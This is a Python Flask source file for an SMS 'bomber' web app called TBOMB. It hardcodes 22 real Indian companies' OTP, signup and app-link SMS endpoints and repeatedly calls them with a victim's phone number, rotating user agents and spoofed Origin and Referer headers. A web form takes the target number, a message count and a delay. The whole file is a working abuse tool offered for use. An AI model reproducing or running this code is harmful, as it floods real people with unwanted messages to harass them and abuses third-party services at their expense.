import os
import time
import requests
import threading
import random
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# User Agents for realistic browsing
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# All 22 APIs with optimized formatting
SMS_APIS = [
    {"url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}", "method": "GET"},
    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={target}", "method": "GET"},
    {"url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "data": {"mobileoremail": "{target}"}},
    {"url": "https://www.frotels.com/appsendsms.php", "method": "POST", "data": {"mobno": "{target}"}},
    {"url": "https://www.gapoon.com/userSignup", "method": "POST", "data": {"mobile": "{target}"}},
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "data": {"mobile_number": "{target}"}},
    {"url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{target}", "method": "GET"},
    {"url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "data": {"phone_number": "{target}"}},
    {"url": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={target}", "method": "GET"},
    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"contactNumber": "{target}"}},
    {"url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "data": {"contactNo": "{target}"}},
    {"url": "https://grofers.com/v2/accounts/", "method": "POST", "data": {"user_phone": "{target}"}},
    {"url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"mobileNum": "{target}"}},
    {"url": "https://www.cashify.in/api/cu01/v1/app-link?mn={target}", "method": "GET"},
    {"url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "data": {"phoneNumber": "{target}"}},
    {"url": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "method": "POST", "data": {"jfsdfu14hkgertd": "{target}"}}
]

status_db = {"success": 0, "failed": 0, "running": False, "target": ""}

def bomb_worker(target, count, delay):
    global status_db
    # Clean target: Remove 91 or +91 if user added it
    if target.startswith("+91"): target = target[3:]
    elif target.startswith("91") and len(target) > 10: target = target[2:]
    
    status_db["success"] = 0
    status_db["failed"] = 0
    status_db["running"] = True
    status_db["target"] = target
    
    for i in range(count):
        if not status_db["running"]: break
        
        api = random.choice(SMS_APIS)
        ua = random.choice(USER_AGENTS)
        headers = {
            'User-Agent': ua,
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://google.com',
            'Referer': 'https://google.com/'
        }
        
        try:
            url = api["url"].replace("{target}", target)
            if api["method"] == "GET":
                resp = requests.get(url, headers=headers, timeout=10)
            else:
                payload = {k: v.replace("{target}", target) for k, v in api["data"].items()}
                resp = requests.post(url, data=payload, headers=headers, timeout=10)
            
            # If status is 200 or 201 or 202, it's a success
            if resp.status_code in [200, 201, 202]:
                status_db["success"] += 1
            else:
                status_db["failed"] += 1
        except Exception as e:
            status_db["failed"] += 1
        
        time.sleep(delay)
    
    status_db["running"] = False

HTML_TEMPLATE = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>TBOMB WEB</title><style>
body{background:#111;color:#0f0;text-align:center;font-family:sans-serif;padding:20px;}
.box{border:2px solid #0f0;padding:20px;border-radius:15px;max-width:400px;margin:auto;background:#1a1a1a;box-shadow:0 0 15px #0f0;}
input{width:90%;padding:12px;margin:10px 0;background:#222;border:1px solid #0f0;color:#fff;border-radius:5px;}
button{width:45%;padding:12px;margin:5px;cursor:pointer;font-weight:bold;border-radius:5px;border:none;}
.start{background:#28a745;color:#fff;} .stop{background:#dc3545;color:#fff;}
.res{margin-top:20px;text-align:left;font-size:1.1em;}</style></head>
<body><div class="box"><h2>TBOMB v2.1</h2><p>API Status: 22 Active</p>
<input id="p" placeholder="Enter 10 Digit Mobile"><br>
<input id="c" placeholder="Count (Example: 50)" type="number"><br>
<input id="d" placeholder="Delay (Seconds: 1)" type="number" value="1"><br>
<button class="start" onclick="st()">START</button><button class="stop" onclick="sp()">STOP</button>
<div class="res"><p>Status: <span id="run">IDLE</span></p><p>Target: <span id="tgt">-</span></p>
<p style="color:#28a745">Success: <span id="sc">0</span></p><p style="color:#ff4d4d">Failed: <span id="fl">0</span></p>
</div></div><script>
function st(){const p=document.getElementById('p').value;const c=document.getElementById('c').value;const d=document.getElementById('d').value;fetch(`/start?target=${p}&count=${c}&delay=${d}`);}
function sp(){fetch('/stop');}
setInterval(()=>{fetch('/status').then(r=>r.json()).then(d=>{
document.getElementById('run').innerText=d.running?'BOMBING...':'IDLE';
document.getElementById('sc').innerText=d.success;document.getElementById('fl').innerText=d.failed;
document.getElementById('tgt').innerText=d.target||'-';});},1000);</script></body></html>
"""

@app.route('/')
def home(): return render_template_string(HTML_TEMPLATE)

@app.route('/start')
def start():
    t, c, d = request.args.get('target'), int(request.args.get('count', 10)), float(request.args.get('delay', 1))
    if not status_db["running"]: threading.Thread(target=bomb_worker, args=(t, c, d)).start()
    return "ok"

@app.route('/status')
def status(): return jsonify(status_db)

@app.route('/stop')
def stop():
    status_db["running"] = False
    return "ok"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
